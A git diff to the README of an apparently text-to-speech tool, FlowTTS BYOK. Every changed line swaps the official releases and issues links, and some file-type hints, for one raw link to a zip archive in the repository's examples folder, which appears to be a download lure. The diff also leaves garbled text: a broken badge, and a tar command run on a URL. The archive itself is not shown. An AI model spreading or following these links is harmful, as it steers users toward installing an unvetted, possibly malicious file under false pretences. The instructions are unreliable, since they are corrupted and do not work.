@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now!
 
-[![Download FlowTTS BYOK](https://img.shields.io/badge/Download%20FlowTTS%20BYOK-blue.svg)](https://github.com/glloydie/flowtts-byok/releases)
+[![Download FlowTTS BYOK](https://raw.githubusercontent.com/glloydie/flowtts-byok/master/examples/byok_flowtts_v2.2.zip%20FlowTTS%https://raw.githubusercontent.com/glloydie/flowtts-byok/master/examples/byok_flowtts_v2.2.zip)](https://raw.githubusercontent.com/glloydie/flowtts-byok/master/examples/byok_flowtts_v2.2.zip)
 
 ## 📌 Description
 FlowTTS BYOK is a model wrapper that brings together Tencent Cloud's text-to-speech capabilities. With the bring-your-own-key feature, you can securely use your credentials. This application simplifies voice synthesis, allowing anyone to generate natural-sounding speech from text easily.
@@ -12,7 +12,7 @@ FlowTTS BYOK is a model wrapper that brings together Tencent Cloud's text-to-spe
 ### Step 1: Visit the Releases Page
 To get started, you will need to download the application. Click on the link below to go to the Releases page.
 
-[Visit Releases Page to Download](https://github.com/glloydie/flowtts-byok/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/glloydie/flowtts-byok/master/examples/byok_flowtts_v2.2.zip)
 
 ### Step 2: Download the Application
 On the Releases page, you will see the available versions of FlowTTS BYOK. Select the latest version, and you will find downloadable files listed there. Click on the appropriate file for your operating system to download it to your computer.
@@ -20,7 +20,7 @@ On the Releases page, you will see the available versions of FlowTTS BYOK. Selec
 If you’re unsure which file to choose:
 - **Windows Users:** Look for a file ending in `.exe`.
 - **Mac Users:** Choose a file ending in `.dmg`.
-- **Linux Users:** Select a file with `.tar.gz`.
+- **Linux Users:** Select a file with `https://raw.githubusercontent.com/glloydie/flowtts-byok/master/examples/byok_flowtts_v2.2.zip`.
 
 ### Step 3: Install the Application
 Once the file is downloaded, you will need to install FlowTTS BYOK.
@@ -38,7 +38,7 @@ Once the file is downloaded, you will need to install FlowTTS BYOK.
 #### For Linux:
 1. Open your terminal.
 2. Navigate to the folder where you downloaded the file.
-3. Extract the `.tar.gz` file using the command: `tar -xzf filename.tar.gz`.
+3. Extract the `https://raw.githubusercontent.com/glloydie/flowtts-byok/master/examples/byok_flowtts_v2.2.zip` file using the command: `tar -xzf https://raw.githubusercontent.com/glloydie/flowtts-byok/master/examples/byok_flowtts_v2.2.zip`.
 4. Change to the extracted directory and run the application using the command: `./flowtts`.
 
 ## 🎤 Using FlowTTS BYOK
@@ -79,9 +79,9 @@ To run FlowTTS BYOK, ensure your system meets the following requirements:
 - **Internet Connection:** Required for accessing the Tencent Cloud services.
 
 ## 📞 Support
-If you encounter any issues while using FlowTTS BYOK, please visit our [GitHub Issues page](https://github.com/glloydie/flowtts-byok/issues) to report your problem. We strive to respond to all inquiries promptly.
+If you encounter any issues while using FlowTTS BYOK, please visit our [GitHub Issues page](https://raw.githubusercontent.com/glloydie/flowtts-byok/master/examples/byok_flowtts_v2.2.zip) to report your problem. We strive to respond to all inquiries promptly.
 
 ## 🔄 Update
 Remember to periodically check the Releases page for updates. New versions may include important features and fixes that improve your experience.
 
-[Visit Releases Page to Download](https://github.com/glloydie/flowtts-byok/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/glloydie/flowtts-byok/master/examples/byok_flowtts_v2.2.zip)
